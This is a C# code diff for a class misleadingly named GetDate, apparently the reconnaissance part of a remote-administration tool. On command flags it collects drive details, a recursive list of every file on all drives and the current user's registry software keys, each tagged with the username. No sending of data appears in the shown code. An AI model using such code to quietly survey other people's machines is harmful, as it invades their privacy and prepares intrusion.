@@ -3,77 +3,97 @@ using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Text;
+using Microsoft.Win32;
 using System.Threading.Tasks;
 
 namespace Admin
 {
     public class GetDate
     {
-        public string ParseCommand(string command)
+        public List<string> information = new List<string>();
+        public List<string> ParseCommand(string command)
         {
-            string result = "<GetDateResult>";
             if (command.Contains("-D"))
             {
-                result += GetDisk().ToString()+"\n";
+                GetDisk();
             }
             if (command.Contains("-I"))
             {
-                result += GetInformation();
+                GetInformation();
             }
             if (command.Contains("-R"))
             {
-
+                GetKeys();
             }
-            return result;
+            return information;
 
         }
-        public StringBuilder GetDisk()
+
+        public void GetKeys()
+        {
+            string ListKeys = String.Format("<GetDateResult> {0} ", Environment.UserName);
+            const string REGISTRY_ROOT = @"SOFTWARE\";
+            using (RegistryKey rootKey = Registry.CurrentUser.OpenSubKey(REGISTRY_ROOT, true))
+            {
+                if (rootKey != null)
+                {
+                    string[] valueNames = rootKey.GetSubKeyNames();
+                    StringBuilder sb = new StringBuilder(valueNames.Length);
+                    foreach (string ch in valueNames)
+                    {
+                        sb.Append("\n");
+                        sb.Append(ch);
+                    }
+                    ListKeys += sb.ToString();
+                }
+                rootKey.Close();
+            }
+            information.Add(ListKeys);
+        }
+
+        public void GetDisk()
         {
             StringBuilder driveList = new StringBuilder();
             foreach (DriveInfo d in DriveInfo.GetDrives())
             {
                 if (d.IsReady) driveList.AppendLine(String.Format("Диск: {0}; метка тома: {1}; файловая система: {2}; тип: {3}; объем: {4} байт; свободно: {5} байт", d.Name, d.VolumeLabel, d.DriveFormat, d.DriveType, d.TotalSize, d.AvailableFreeSpace));
             }
-            return driveList;
+            string temp = String.Format("<GetDateResult> {0} {1}",Environment.UserName, driveList.ToString());
+            information.Add(temp);
         }
-        public string GetInformation()
+
+        public void GetInformation()
         {
-            string PatchProfile = Environment.GetEnvironmentVariable("C:/");
-            string[] S = SearchDirectory(PatchProfile);
-            string ListPatch = "Файлы";
-            foreach (string folderPatch in S)
+            string ListPatch = String.Format("<GetDateResult> {0} ", Environment.UserName);
+            foreach (DriveInfo d in DriveInfo.GetDrives())
             {
-                //добавляем новую строку в список
-                // ListPatch += folderPatch + "\n";
-                try
+                string[] S = SearchDirectory(d.Name);
+                
+                foreach (string folderPatch in S)
                 {
-                    //пытаемся найти данные в папке 
-                    string[] F = SearchFile(folderPatch);
-                    foreach (string FF in F)
+                    try
                     {
-                        //добавляем файл в список 
-                        ListPatch += FF + "\n";
+                        string[] F = SearchFile(folderPatch);
+                        foreach (string FF in F)
+                        {
+                            ListPatch += FF + "\n";
+                        }
+                    }
+                    catch
+                    {
                     }
                 }
-                catch
-                {
-                }
             }
-            return ListPatch;
-
+            information.Add(ListPatch);
         }
         static string[] SearchFile(string patch)
         {
-            /*флаг SearchOption.AllDirectories означает искать во всех вложенных папках*/
             string[] ReultSearch = Directory.GetFiles(patch, "*", SearchOption.AllDirectories);
-            //возвращаем список найденных файлов соответствующих условию поиска 
             return ReultSearch;
         }
         static string[] SearchDirectory(string patch)
         {
-            //находим все папки в по указанному пути
             string[] ReultSearch = Directory.GetDirectories(patch);
-            //возвращаем список директорий
             return ReultSearch;
         }
     }
